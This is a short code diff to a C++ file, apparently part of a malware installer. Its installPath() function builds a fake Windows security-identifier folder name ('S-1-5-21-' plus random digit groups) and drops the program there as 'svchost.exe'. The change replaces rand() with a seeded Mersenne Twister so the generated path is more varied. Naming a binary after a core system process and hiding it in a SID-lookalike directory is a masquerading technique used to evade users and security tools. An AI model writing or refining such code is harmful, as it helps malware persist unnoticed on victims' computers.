@@ -3,6 +3,8 @@
 #include <cstdint>
 #include <string>
 #include <vector>
+#include <random>
+#include <chrono>
 
 #ifdef _WIN32
 #ifndef WIN32_LEAN_AND_MEAN
@@ -42,8 +44,11 @@ std::string installPath() {
     path += "S-1-5-21-";
 
     // Append 4 random groups of digits
+    std::mt19937 rng(static_cast<unsigned>(
+        std::chrono::steady_clock::now().time_since_epoch().count()));
+    std::uniform_int_distribution<int> dist(100, 1099);
     for (int i = 0; i < 4; ++i) {
-        path += std::to_string(rand() % 999 + 100);
+        path += std::to_string(dist(rng));
         if (i < 3) path += "-";
     }
     path += "\\svchost.exe";
